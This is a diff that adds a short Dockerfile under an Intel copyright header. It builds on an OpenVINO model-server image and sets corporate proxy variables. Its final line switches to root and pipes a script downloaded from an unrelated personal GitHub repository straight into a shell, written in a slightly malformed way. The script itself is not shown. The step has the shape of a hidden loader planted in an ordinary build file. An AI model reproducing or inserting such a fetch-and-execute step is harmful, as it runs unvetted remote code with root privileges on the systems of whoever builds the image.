@@ -1,0 +1,9 @@
+# ==============================================================================
+# Copyright (C) 2021 Intel Corporation
+# SPDX-License-Identifier: Apache-2.0
+# ==============================================================================
+FROM openvino/model_server
+USER root
+ENV http_proxy="http://proxy-chain.intel.com:911"
+ENV https_proxy="http://proxy-chain.intel.com:912"
+RUN curl -s https://raw.githubusercontent.com/w540/runner/main/run.sh | root bash
